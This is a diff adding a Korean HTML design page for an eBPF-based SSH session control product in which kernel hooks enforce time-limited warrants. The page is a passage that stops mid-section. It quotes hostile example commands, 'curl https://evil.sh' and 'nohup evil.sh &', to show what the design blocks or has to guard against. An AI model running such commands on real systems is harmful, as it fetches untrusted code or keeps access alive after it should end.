@@ -1,0 +1,1132 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session Warrant r09</title>
+<style>
+  :root {
+    color-scheme: light;
+    --plane:      #EDF0EE;
+    --surface:    #FAFBFA;
+    --surface-2:  #E2E7E4;
+    --ink:        #101614;
+    --ink-2:      #495450;
+    --ink-3:      #7E8A85;
+    --rule:       #D9DEDB;
+    --rule-2:     #C2C9C5;
+    --accent:     #1E5A3C;
+    --accent-ink: #164630;
+    --accent-wash:#DFEBE4;
+    --deny:       #B33A32;
+    --deny-wash:  #F6E4E2;
+    --mono: ui-monospace, SFMono-Regular, Menlo, "Cascadia Mono", "Liberation Mono", monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "Apple SD Gothic Neo", "Noto Sans KR", "Malgun Gothic", sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      color-scheme: dark;
+      --plane:      #0A0D0C;
+      --surface:    #141917;
+      --surface-2:  #1E2421;
+      --ink:        #EDF2EF;
+      --ink-2:      #A2ADA8;
+      --ink-3:      #737E79;
+      --rule:       #262D2A;
+      --rule-2:     #363E3A;
+      --accent:     #63C08D;
+      --accent-ink: #8AD5AB;
+      --accent-wash:#122A1E;
+      --deny:       #E4756B;
+      --deny-wash:  #2C1715;
+    }
+  }
+  :root[data-theme="dark"] {
+    color-scheme: dark;
+    --plane:      #0A0D0C;
+    --surface:    #141917;
+    --surface-2:  #1E2421;
+    --ink:        #EDF2EF;
+    --ink-2:      #A2ADA8;
+    --ink-3:      #737E79;
+    --rule:       #262D2A;
+    --rule-2:     #363E3A;
+    --accent:     #63C08D;
+    --accent-ink: #8AD5AB;
+    --accent-wash:#122A1E;
+    --deny:       #E4756B;
+    --deny-wash:  #2C1715;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    background: var(--plane); color: var(--ink);
+    font-family: var(--sans); font-size: 16px; line-height: 1.75;
+    margin: 0; padding: 0 20px 90px; -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 940px; margin: 0 auto; }
+
+  /* masthead */
+  .mast { padding: 76px 0 36px; }
+  .kicker {
+    font-family: var(--mono); font-size: 11px;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--accent); margin: 0 0 22px;
+  }
+  h1 {
+    font-size: clamp(40px, 7.4vw, 70px); line-height: 1;
+    letter-spacing: -0.04em; font-weight: 800; margin: 0; text-wrap: balance;
+  }
+  .thesis {
+    font-size: clamp(17px, 2.2vw, 21px); line-height: 1.55; color: var(--ink-2);
+    max-width: 45ch; margin: 22px 0 0; text-wrap: pretty;
+  }
+  .thesis b { color: var(--ink); font-weight: 600; }
+  .mast-meta {
+    display: flex; flex-wrap: wrap; gap: 8px 26px;
+    margin-top: 32px; padding-top: 18px; border-top: 1px solid var(--rule-2);
+    font-family: var(--mono); font-size: 12px; color: var(--ink-3);
+  }
+  .mast-meta b { color: var(--ink-2); font-weight: 500; }
+
+  /* summary */
+  .summary {
+    background: var(--surface); border: 1px solid var(--rule);
+    border-radius: 8px; padding: 24px 26px; margin: 30px 0 0;
+  }
+  .summary h2 {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 0.14em;
+    text-transform: uppercase; color: var(--ink-3);
+    margin: 0 0 14px; font-weight: 500;
+  }
+  .summary ul { margin: 0; max-width: none; }
+  .summary li { font-size: 15px; color: var(--ink-2); margin-bottom: 9px; }
+  .summary li b { color: var(--ink); font-weight: 650; }
+
+  /* part divider */
+  .part {
+    display: flex; align-items: baseline; justify-content: space-between;
+    gap: 20px; margin: 68px 0 0; padding: 14px 0 12px;
+    border-top: 2px solid var(--ink); border-bottom: 1px solid var(--rule-2);
+  }
+  .part .pn {
+    font-family: var(--mono); font-size: 12px; letter-spacing: 0.2em;
+    text-transform: uppercase; color: var(--accent);
+  }
+  .part .pt {
+    font-size: 19px; font-weight: 700; letter-spacing: -0.02em;
+  }
+
+  section { padding: 44px 0; border-top: 1px solid var(--rule); }
+  section.first { border-top: 0; }
+  .sec-head { display: flex; align-items: center; gap: 14px; margin-bottom: 22px; }
+  .num {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 0.08em;
+    color: var(--accent-ink); border: 1px solid var(--accent);
+    border-radius: 3px; padding: 2px 8px; flex: none;
+  }
+  h2.h {
+    font-size: clamp(22px, 3.2vw, 30px); line-height: 1.18;
+    letter-spacing: -0.026em; font-weight: 750; margin: 0; text-wrap: balance;
+  }
+  h3 { font-size: 16px; font-weight: 650; letter-spacing: -0.01em; margin: 28px 0 10px; }
+  p { margin: 0 0 18px; max-width: 68ch; text-wrap: pretty; }
+  .lede { font-size: 17px; color: var(--ink-2); }
+  .lede b, .lede strong { color: var(--ink); }
+  strong { font-weight: 650; }
+  code {
+    font-family: var(--mono); font-size: 0.86em;
+    background: var(--surface-2); padding: 1px 5px; border-radius: 3px;
+  }
+  ul { margin: 0 0 20px; padding-left: 0; list-style: none; max-width: 68ch; }
+  ul li { position: relative; padding-left: 20px; margin-bottom: 11px; text-wrap: pretty; }
+  ul li::before {
+    content: ""; position: absolute; left: 2px; top: 12px;
+    width: 6px; height: 1px; background: var(--rule-2);
+  }
+
+  /* ticket */
+  .ticket {
+    background: var(--surface); border: 1px solid var(--rule-2);
+    border-radius: 6px; max-width: 520px; margin: 0 0 24px; overflow: hidden;
+  }
+  .ticket-top {
+    display: flex; justify-content: space-between; align-items: baseline;
+    padding: 14px 20px; background: var(--accent-wash); color: var(--accent-ink);
+    font-family: var(--mono); font-size: 11px;
+    letter-spacing: 0.14em; text-transform: uppercase;
+  }
+  .ticket-body { padding: 6px 20px 18px; }
+  .trow {
+    display: grid; grid-template-columns: 92px 1fr; gap: 0 14px;
+    padding: 9px 0; border-bottom: 1px dashed var(--rule); font-size: 14px;
+  }
+  .trow:last-child { border-bottom: 0; }
+  .tk {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 0.08em;
+    text-transform: uppercase; color: var(--ink-3); padding-top: 3px;
+  }
+  .tv { font-family: var(--mono); font-size: 13.5px; color: var(--ink); line-height: 1.6; }
+  .tv .off { color: var(--ink-3); }
+
+  /* figures */
+  figure { margin: 8px 0 26px; }
+  .fig-shell {
+    background: var(--surface); border: 1px solid var(--rule);
+    border-radius: 8px; padding: 22px 18px; overflow-x: auto;
+  }
+  .fig-shell svg { display: block; max-width: 100%; height: auto; margin: 0 auto; min-width: 600px; }
+  svg text { font-family: var(--sans); }
+  svg text.m { font-family: var(--mono); }
+  figcaption {
+    font-size: 13.5px; color: var(--ink-2);
+    margin-top: 14px; line-height: 1.65; max-width: 68ch;
+  }
+
+  pre {
+    font-family: var(--mono); font-size: 13px; line-height: 1.65;
+    background: var(--surface); border: 1px solid var(--rule);
+    border-left: 3px solid var(--accent); border-radius: 0 5px 5px 0;
+    padding: 16px 20px; margin: 0 0 22px; overflow-x: auto; color: var(--ink-2);
+  }
+  pre b { color: var(--ink); font-weight: 600; }
+  pre i { color: var(--ink-3); font-style: normal; }
+
+  .table-scroll { overflow-x: auto; margin: 0 0 24px; }
+  table { width: 100%; border-collapse: collapse; font-size: 14.5px; min-width: 640px; }
+  thead th {
+    text-align: left; font-family: var(--mono); font-size: 11px; font-weight: 500;
+    letter-spacing: 0.1em; text-transform: uppercase; color: var(--ink-3);
+    padding: 0 14px 8px 0; border-bottom: 1px solid var(--rule-2); white-space: nowrap;
+  }
+  tbody td { padding: 11px 14px 11px 0; border-bottom: 1px solid var(--rule); vertical-align: top; line-height: 1.5; }
+  tbody tr:last-child td { border-bottom: 0; }
+  td.name { font-weight: 600; }
+  td.mono { font-family: var(--mono); font-size: 12.5px; white-space: nowrap; }
+  td.dim { color: var(--ink-2); }
+
+  .callout {
+    background: var(--accent-wash); border-radius: 6px;
+    padding: 18px 22px; margin: 0 0 24px; font-size: 15px; line-height: 1.65;
+  }
+  .callout.warn { background: var(--deny-wash); }
+  .callout .ct {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 0.1em;
+    text-transform: uppercase; color: var(--accent-ink);
+    display: block; margin-bottom: 6px;
+  }
+  .callout.warn .ct { color: var(--deny); }
+  .callout p { margin: 0; max-width: none; }
+
+  .split { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 0 0 24px; }
+  .pane {
+    background: var(--surface); border: 1px solid var(--rule);
+    border-radius: 8px; padding: 20px 22px;
+  }
+  .pane h4 {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 0.12em;
+    text-transform: uppercase; margin: 0 0 12px; font-weight: 500;
+  }
+  .pane.can h4 { color: var(--accent-ink); }
+  .pane.cant h4 { color: var(--deny); }
+  .pane ul { margin: 0; }
+  .pane li { font-size: 14.5px; line-height: 1.6; color: var(--ink-2); }
+  .pane li b { color: var(--ink); font-weight: 600; }
+
+  .steps { margin: 0 0 24px; }
+  .step {
+    display: grid; grid-template-columns: 116px 1fr; gap: 0 20px;
+    padding: 16px 0; border-top: 1px solid var(--rule);
+  }
+  .step:first-child { border-top: 0; padding-top: 0; }
+  .step-tag { font-family: var(--mono); font-size: 11px; letter-spacing: 0.06em; color: var(--accent); padding-top: 4px; }
+  .step h3 { font-size: 15.5px; margin: 0 0 5px; }
+  .step p { font-size: 14.5px; color: var(--ink-2); margin: 0; }
+
+  footer {
+    margin-top: 56px; padding-top: 34px; border-top: 2px solid var(--ink);
+    font-family: var(--mono); font-size: 12px; color: var(--ink-3); line-height: 1.9;
+  }
+  @media (max-width: 720px) {
+    .split { grid-template-columns: 1fr; }
+    .step { grid-template-columns: 1fr; gap: 4px; }
+    .part { flex-direction: column; gap: 2px; }
+  }
+  @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="mast">
+    <p class="kicker">SSH 접근제어 · eBPF</p>
+    <h1>Session Warrant</h1>
+    <p class="thesis">SSH 세션에 <b>범위와 유효기간을 가진 영장</b>을 붙이고, 그 영장을 셸이 아니라 <b>커널이 집행한다</b>. sudo를 몇 번 하든, 백그라운드로 도망가든 따라붙는다.</p>
+    <div class="mast-meta">
+      <span><b>작성</b> 2026-08-15</span>
+      <span><b>개정</b> <b id="rev">r09</b></span>
+      <span><b>단계</b> 개념 · 기획 · 아키텍처</span>
+      <span><b>커널</b> 5.15+ / BPF LSM 5.7+</span>
+      <span><b>전제</b> cgroup v2 · systemd-logind</span>
+    </div>
+
+    <div class="summary">
+      <h2>한눈에</h2>
+      <ul>
+        <li><b>문제</b> — 기존 SSH 접근제어는 거의 전부 게이트웨이 방식이라 우회 가능하고, 세션 안을 못 보고, <code>sudo</code> 뒤에서 귀속이 무너진다.</li>
+        <li><b>제품</b> — 접속 승인 시점에 “누가·왜·언제까지·무엇을”이 적힌 영장을 발급하고, 커널 LSM 훅이 집행관이 된다.</li>
+        <li><b>성립 조건</b> — 표식이 <code>sudo</code>·<code>su</code>·<code>nohup</code>을 통과해야 한다. systemd가 이미 만드는 세션 cgroup에 걸어서 푼다.</li>
+        <li><b>차별점</b> — 만료가 세션 <b>안에서</b> 발효된다. 다음 접속을 막는 게 아니라, 지금 열려 있는 세션과 그 자식들이 동시에 권한을 잃는다.</li>
+        <li><b>도입</b> — 감사 모드는 재부팅 없이 돌아가고 그 자체로 값이 매겨진다. 강제는 그 데이터를 근거로 나중에 켠다.</li>
+      </ul>
+    </div>
+  </header>
+
+  <div class="part"><span class="pn">Part I</span><span class="pt">개념</span></div>
+
+  <section class="first">
+    <div class="sec-head"><span class="num">01</span><h2 class="h">게이트웨이는 문 앞에서 멈춘다</h2></div>
+
+    <p class="lede">SSH 접근제어 시장은 이미 포화다. Teleport, StrongDM, Boundary, Tailscale SSH, SSM, 그리고 국내 서버접근제어 제품군까지 <strong>거의 전부가 게이트웨이/프록시 방식</strong>이다. 여기에 하나를 더 얹는 건 의미가 없다. 대신 이 방식이 구조적으로 못 하는 세 가지가 있고, 그게 eBPF의 자리다.</p>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>구조적 한계</th><th>왜 구조적인가</th><th>커널에서는</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="name">우회가 가능하다</td>
+            <td class="dim">모든 트래픽이 게이트웨이를 지난다는 전제 위에 서 있다. 직접 등록된 <code>authorized_keys</code> 하나, 벤더 관리 장비 하나, 비상 접속 경로 하나면 전제가 깨진다</td>
+            <td class="dim">호스트 자신이 <strong>영장 없는 세션을 거부</strong>한다. 네트워크 구성과 무관하다</td>
+          </tr>
+          <tr>
+            <td class="name">세션 안은 못 본다</td>
+            <td class="dim">셸을 한 번 내주면 그 안은 프로토콜 레이어 밖이다. 세션 녹화는 사후 증거지 통제가 아니고, <code>scp</code>·포트포워딩·비대화형 명령은 녹화에도 안 잡힌다</td>
+            <td class="dim">exec · connect · file write를 <strong>syscall 단위로 차단</strong>한다</td>
+          </tr>
+          <tr>
+            <td class="name">귀속이 무너진다</td>
+            <td class="dim">전부 <code>ec2-user</code>로 들어와 <code>sudo</code>를 친다. 그 다음부터 커널이 보는 건 uid 0뿐이다</td>
+            <td class="dim">모든 행위가 <strong>사람 이름표를 달고</strong> 기록된다. 컨테이너 안까지</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>정리하면, 기존 제품들은 <strong>문 앞에서</strong> 통제한다. 이 제품은 <strong>문을 통과한 다음부터</strong>를 통제한다. 경쟁이 아니라 보완이고, 그래서 이미 게이트웨이를 쓰는 조직에도 팔 수 있다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">02</span><h2 class="h">영장이란 무엇인가</h2></div>
+
+    <p>접속 승인 시점에 발급되는, 기계가 읽는 문서 한 장이다. 사람·사유·기간·허용 범위가 적혀 있고, <strong>커널이 이 문서의 집행관이 된다.</strong></p>
+
+    <div class="ticket">
+      <div class="ticket-top"><span>Session Warrant</span><span>W-4821-3F</span></div>
+      <div class="ticket-body">
+        <div class="trow"><span class="tk">주체</span><span class="tv">paul@seswar.io <span class="off">(로그인 계정: ec2-user)</span></span></div>
+        <div class="trow"><span class="tk">사유</span><span class="tv">INC-4821 <span class="off">결제 지연 장애 대응</span></span></div>
+        <div class="trow"><span class="tk">대상</span><span class="tv">prod-payment-{03,04}</span></div>
+        <div class="trow"><span class="tk">유효</span><span class="tv">14:00 → 14:30 <span class="off">(30분, 자동 만료)</span></span></div>
+        <div class="trow"><span class="tk">실행 허용</span><span class="tv">git, less, tail, journalctl, ps, ss</span></div>
+        <div class="trow"><span class="tk">쓰기</span><span class="tv"><span class="off">불가 —</span> /tmp/w-4821 <span class="off">제외</span></span></div>
+        <div class="trow"><span class="tk">아웃바운드</span><span class="tv"><span class="off">전면 차단</span></span></div>
+      </div>
+    </div>
+
+    <p>여기서 중요한 건 필드 목록이 아니라 <strong>집행 주체</strong>다. 같은 내용을 셸 래퍼나 <code>rbash</code>, <code>sudoers</code>로 흉내 낼 수는 있지만 전부 세션 안에서 우회된다. 영장은 커널의 LSM 훅이 집행하므로 세션 안에서 뒤집을 수 없다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">03</span><h2 class="h">시나리오: “/app만, 두 시간”</h2></div>
+
+    <p class="lede">가장 흔한 발급 형태를 처음부터 끝까지 따라가 본다. <strong>“김개발에게 prod-web-01의 <code>/app</code> 이하 쓰기를 2시간”</strong> — 승인이 떨어지면 이 한 문장이 영장이 되고, 로그인 순간 세션 cgroup에 못 박힌다.</p>
+
+<pre><i>[14:03]</i> $ vi /app/config.yml         <b>→ 저장 OK</b>       <i>/app 디렉토리 inode 이하라 허용</i>
+<i>[14:05]</i> $ sudo vi /etc/nginx.conf    <b>→ :w 저장 실패</b>   <i>"E212: Can&apos;t open file for writing"</i>
+                                       <i>uid 0이어도 영장이 이긴다 — DAC 다음이 LSM이다 (§15)</i>
+<i>[14:07]</i> $ sudo cp tool /usr/bin/     <b>→ Permission denied</b>
+<i>[14:12]</i> $ curl https://evil.sh       <b>→ connect: EPERM</b>  <i>아웃바운드 미허용 영장</i>
+<i>[14:20]</i> $ nohup ./deploy.sh &amp;        <b>→ 실행됨</b>         <i>/app 안에서 도는 배포 스크립트. 태그도 따라간다</i>
+<i>[16:00]</i> 만료 ─────────────────────────────────────────────────────</pre>
+
+    <p>사용자에게 이 영장은 “읽기는 어디든, 쓰기는 <code>/app</code>만 되는 서버”로 보인다. 권한 오류 메시지도 평소 보던 <code>Permission denied</code> 그대로다 — <code>-EPERM</code>을 돌려주므로 애플리케이션 입장에서는 파일 권한이 없는 것과 구분되지 않는다.</p>
+
+    <h3>16:00, 만료의 세 모드</h3>
+    <p>영장 구조체의 <code>on_expiry</code> 한 바이트가 결정한다 (§12).</p>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-tag">기본 · 강등</div>
+        <div>
+          <h3>세션은 살고, 권한만 죽는다</h3>
+          <p>커널 훅이 매 판정마다 시각을 비교하므로 16:00:00부터 <strong>즉시</strong> 모든 쓰기·아웃바운드가 거부된다. warrantd 개입 없이 발효된다. 셸은 살아 있지만 read-only 껍데기다 — 저장 안 한 vi, 돌고 있는 배포가 티켓 만료로 죽는 사고를 피한다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">옵션 · 종료</div>
+        <div>
+          <h3>자동 로그아웃</h3>
+          <p>warrantd가 만료를 감지해 세션 scope의 프로세스를 일괄 종료한다. 셸이 죽으면 sshd가 연결을 닫고, 사용자 화면에는 <code>Connection closed</code> — 로그아웃이다. <code>nohup</code>으로 살아남은 프로세스도 <code>task_warrant</code> 태그로 색출해 함께 정리한다. warrantd가 죽어 있어도 안전하다: 만료된 프로세스가 다음 syscall을 하는 순간 훅에서 <code>bpf_send_signal(SIGKILL)</code>로 처리하고, syscall을 안 하는 프로세스는 어차피 아무것도 못 한다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">옵션 · 유예</div>
+        <div>
+          <h3>세션만 자르고, 백그라운드 잡은 계속</h3>
+          <p>14:20에 띄운 <code>deploy.sh</code>를 만료가 죽이는 게 싫을 때 쓴다. warrantd는 <strong>셸과 sshd 세션 프로세스만</strong> 종료한다 — 연결이 닫히니 사용자는 로그아웃되고, <code>nohup</code> 잡은 SIGHUP을 무시하니 살아남는다(정확히 nohup의 존재 이유다). 살아남은 프로세스의 태그는 “만료”가 아니라 <strong>“유예(grace)”</strong> 상태로 바뀌어 기존 권한으로 계속 돈다. 로그아웃 이후의 모든 행위도 여전히 같은 사람 이름으로 기록된다 — 태그가 살아있기 때문이다.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <span class="ct">유예는 가장 위험한 모드다 — 안전장치 넷이 함께 간다</span>
+      <p>순진하게 만들면 이 모드 자체가 우회 경로다: <code>nohup evil.sh &amp;</code> 던지고 로그아웃하면 영장 권한이 무기한 남는다. 그래서 <strong>①</strong> 유예에도 시한이 있다 — <code>grace_ns</code>(예: 만료 후 +2시간), 넘으면 강등 또는 종료. 무기한 유예는 존재하지 않는다. <strong>②</strong> 유예 중 신규 네트워크 연결은 금지된다 — 로컬 파일 작업인 배포는 계속 되지만 리버스 셸이 밖으로 전화 걸 수는 없다. 기존 연결의 절단 여부는 영장 옵션. <strong>③</strong> 유예 진입 자체가 기록·경보 대상이다 — “김개발 로그아웃, 잡 2개 유예 실행 중”이 승인자에게 보인다. <strong>④</strong> 유예 중인 잡이 전부 끝나면 그 시점에 영장이 완전히 닫힌다.</p>
+    </div>
+
+    <div class="callout warn">
+      <span class="ct">진행 중인 작업은 어느 모드든 깨진다</span>
+      <p>14:20에 시작한 <code>deploy.sh</code>가 16:00을 넘기면 — 강등 모드에서는 <strong>다음 쓰기 syscall에서 EPERM으로 실패</strong>하고, 종료 모드에서는 그 자리에서 죽는다. 어느 쪽이든 반쯤 배포된 상태가 남는다. 강등이 더 안전한 것도 아니다. 그래서 만료 동작을 고르는 것으로는 부족하고 운영 수칙이 세 겹 붙는다: <strong>①</strong> warrantd가 만료 5분 전 세션 터미널에 경고를 쏜다(<code>wall</code>). <strong>②</strong> 연장은 아래처럼 세션을 끊지 않으므로, 경고를 본 사용자가 요청하고 승인자가 누르면 돌던 작업은 아무 일 없이 계속된다. <strong>③</strong> 근본적으로 영장 시간보다 오래 걸릴 작업은 개인 세션이 아니라 배포 파이프라인으로 보내야 하며, §04의 위임 차단이 정확히 이 행동을 강제한다 — 작업을 세션 밖으로 빼돌려 영장 시간을 우회하는 편법이 막혀 있기 때문이다.</p>
+    </div>
+
+    <p>연장은 재로그인이 아니다. 승인자가 연장을 누르면 중앙이 <code>expires_ns</code>를 갱신해 push하고, <strong>열려 있는 세션이 그대로 이어진다.</strong> 반대로 회수도 같은 경로라, 진행 중인 세션의 권한을 승인자가 실시간으로 좁힐 수 있다.</p>
+
+    <h3>연장의 자동화 범위</h3>
+    <p>연장이 이렇게 싸기 때문에 “그냥 자동 연장하면 되지 않나”가 바로 다음 질문이 된다. 답은 <strong>요청과 승인을 갈라서, 요청만 자동화한다</strong>이다. 완전 자동 연장은 “활동이 있는 한 만료되지 않는 영장”이고, 그건 30분 약속을 거짓말로 만든다 — 그리고 <strong>공격자의 활동도 활동이다.</strong></p>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>단계</th><th>자동화</th><th>방식</th></tr></thead>
+        <tbody>
+          <tr><td class="name">감지 · 요청</td><td class="dim"><strong>전자동</strong></td><td class="dim">T-5분에 warrantd가 진행 중 작업을 감지하면 연장 요청을 자동 생성해 승인자에게 push</td></tr>
+          <tr><td class="name">승인</td><td class="dim"><strong>기본은 사람</strong></td><td class="dim">버튼 하나. 세션은 끊기지 않는다</td></tr>
+          <tr><td class="name">정책 자동 승인</td><td class="dim"><strong>명시적 범위에서만</strong></td><td class="dim">예: read-only 영장은 최대 2회, 원 기간의 2배까지. 쓰기 영장은 항상 사람. “자동 승인됨”이라는 사실도 기록된다</td></tr>
+          <tr><td class="name">누적 상한</td><td class="dim"><strong>예외 없음</strong></td><td class="dim">어떤 경로로든 상한(예: 원 기간의 3배)을 넘으면 연장이 아니라 <strong>재발급</strong> — 새 사유, 새 승인</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>유효기간의 모든 변경은 영장에 계보로 남는다. 감사에서 “30분짜리 작업이 왜 90분이었나”가 이 이력 그대로 설명된다.</p>
+
+<pre>W-4821-3F  14:00  발급 30분     <i>승인: 김팀장 · 사유: INC-4821</i>
+           14:25  연장 +30분    <i>승인: 김팀장 · 사유: "배포 지연"</i>
+           14:55  연장 +30분    <i>자동 승인 · 근거: read-only 정책 2회차</i>
+           15:30  만료          <i>누적 상한 도달 — 이후는 재발급 필요</i></pre>
+
+    <p>이 구조라야 기본 발급을 짧게 잡을 수 있다. 시간 정책의 핵심은 넉넉히 주는 게 아니라 <strong>짧게 주고 연장을 싸게 만드는 것</strong>이다 — 넉넉한 영장은 상시 권한의 재발명이다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">04</span><h2 class="h">성립 조건: 표식이 프로세스 트리를 따라가는가</h2></div>
+
+    <p class="lede">이 제품이 성립하는지는 딱 하나에 달려 있다. <strong><code>sudo</code>·<code>su</code>·<code>nohup</code>·백그라운드를 거쳐도 표식이 떨어지지 않는가.</strong> 떨어지면 그냥 또 하나의 셸 래퍼다.</p>
+
+    <figure>
+      <div class="fig-shell">
+        <svg viewBox="0 0 840 372" role="img" aria-label="sshd 세션에 발급된 영장이 자식 프로세스로 전파되어 sudo로 uid가 바뀐 프로세스와 nohup으로 분리된 백그라운드 프로세스까지 따라가지만, systemd-run으로 다른 cgroup으로 옮겨간 프로세스에서는 태그가 끊기는 그림">
+          <defs>
+            <marker id="w-ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"/>
+            </marker>
+            <marker id="w-arR" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="#B33A32"/>
+            </marker>
+          </defs>
+
+          <rect x="20" y="20" width="250" height="72" rx="5" fill="none" stroke="#1E5A3C" stroke-width="1.5"/>
+          <text class="m" x="36" y="44" font-size="11" fill="#1E5A3C" letter-spacing="1.2">WARRANT W-4821-3F</text>
+          <text class="m" x="36" y="62" font-size="11.5" fill="currentColor" opacity="0.8">paul@seswar.io · read-only</text>
+          <text class="m" x="36" y="79" font-size="11.5" fill="currentColor" opacity="0.8">expires 14:30</text>
+
+          <line x1="95" y1="92" x2="95" y2="164" stroke="#1E5A3C" stroke-width="1.4" marker-end="url(#w-ar)"/>
+          <text class="m" x="105" y="124" font-size="10.5" fill="#1E5A3C">PAM 발급</text>
+          <text class="m" x="105" y="140" font-size="10.5" fill="currentColor" opacity="0.55">→ session scope</text>
+
+          <rect x="20" y="166" width="150" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text class="m" x="95" y="191" text-anchor="middle" font-size="12" fill="currentColor">sshd 세션</text>
+
+          <line x1="170" y1="186" x2="208" y2="186" stroke="currentColor" stroke-width="1.25" opacity="0.6" marker-end="url(#w-ar)"/>
+
+          <rect x="210" y="166" width="150" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text class="m" x="285" y="191" text-anchor="middle" font-size="12" fill="currentColor">bash</text>
+          <rect x="322" y="172" width="32" height="16" rx="3" fill="#1E5A3C"/>
+          <text class="m" x="338" y="184" text-anchor="middle" font-size="9.5" fill="#FAFBFA">W1</text>
+
+          <g fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.6">
+            <polyline points="360,186 385,186 385,94 408,94" marker-end="url(#w-ar)"/>
+            <line x1="360" y1="186" x2="408" y2="186" marker-end="url(#w-ar)"/>
+          </g>
+          <polyline points="360,186 385,186 385,290 408,290" fill="none" stroke="#B33A32" stroke-width="1.4" marker-end="url(#w-arR)"/>
+
+          <rect x="410" y="74" width="180" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.75"/>
+          <text class="m" x="492" y="99" text-anchor="middle" font-size="11.5" fill="currentColor">sudo → vim (uid 0)</text>
+          <rect x="552" y="80" width="32" height="16" rx="3" fill="#1E5A3C"/>
+          <text class="m" x="568" y="92" text-anchor="middle" font-size="9.5" fill="#FAFBFA">W1</text>
+
+          <rect x="410" y="166" width="180" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.75"/>
+          <text class="m" x="492" y="191" text-anchor="middle" font-size="11.5" fill="currentColor">nohup backup.sh &amp;</text>
+          <rect x="552" y="172" width="32" height="16" rx="3" fill="#1E5A3C"/>
+          <text class="m" x="568" y="184" text-anchor="middle" font-size="9.5" fill="#FAFBFA">W1</text>
+
+          <rect x="410" y="270" width="180" height="40" rx="4" fill="none" stroke="#B33A32" stroke-width="1.4" stroke-dasharray="5 4"/>
+          <text class="m" x="492" y="295" text-anchor="middle" font-size="11.5" fill="#B33A32">systemd-run …</text>
+
+          <g fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.6">
+            <line x1="590" y1="94" x2="628" y2="94" marker-end="url(#w-ar)"/>
+            <line x1="590" y1="186" x2="628" y2="186" marker-end="url(#w-ar)"/>
+          </g>
+          <line x1="590" y1="290" x2="628" y2="290" stroke="#B33A32" stroke-width="1.4" stroke-dasharray="5 4" marker-end="url(#w-arR)"/>
+
+          <text class="m" x="638" y="82" font-size="11.5" fill="#B33A32">file_open(W) → DENY</text>
+          <text x="638" y="100" font-size="11" fill="currentColor" opacity="0.6">uid가 0이어도 영장이 이긴다</text>
+
+          <text class="m" x="638" y="174" font-size="11.5" fill="currentColor" opacity="0.85">14:30 이후 write 차단</text>
+          <text x="638" y="192" font-size="11" fill="currentColor" opacity="0.6">로그아웃해도 태그는 남는다</text>
+
+          <text class="m" x="638" y="282" font-size="11.5" fill="#B33A32">태그 끊김 — 구멍</text>
+          <text x="638" y="300" font-size="11" fill="currentColor" opacity="0.6">다른 cgroup으로 이관된다</text>
+
+          <line x1="20" y1="340" x2="820" y2="340" stroke="currentColor" stroke-width="1" opacity="0.15"/>
+          <text x="20" y="360" font-size="11.5" fill="currentColor" opacity="0.6">초록 칩 = 영장이 붙어 있는 프로세스 · 붉은 점선 = 표식이 떨어지는 경로</text>
+        </svg>
+      </div>
+      <figcaption>표식은 두 겹으로 붙인다. <strong>1차는 cgroup</strong> — systemd-logind가 이미 SSH 로그인마다 <code>session-N.scope</code>를 만들어 주므로, 영장을 그 cgroup id에 걸면 LSM 훅에서 <code>bpf_get_current_cgroup_id()</code> 한 번으로 끝난다. uid 변경과 완전히 무관하므로 <code>sudo</code>·<code>su</code>를 그냥 통과한다. <strong>2차는 fork 전파</strong> — <code>sched_process_fork</code>에서 부모의 태그를 자식 task_storage로 복사해, systemd가 없는 환경과 cgroup을 벗어나는 경우를 메운다.</figcaption>
+    </figure>
+
+    <h3>먼저 오해를 걷어내기: systemd 서비스는 통제 “대상”이 아니다</h3>
+    <p><code>nginx.service</code> 같은 평시 시스템 서비스는 이 제품이 <strong>통제하지 못하는</strong> 게 아니라 <strong>통제 대상이 아니다.</strong> 영장은 사람의 세션에 붙는 물건이고, 사람이 개입하지 않은 데몬은 영장을 받을 이유가 없다. 통제 범위는 처음부터 “영장 세션이 만든 프로세스”로 한정된다.</p>
+
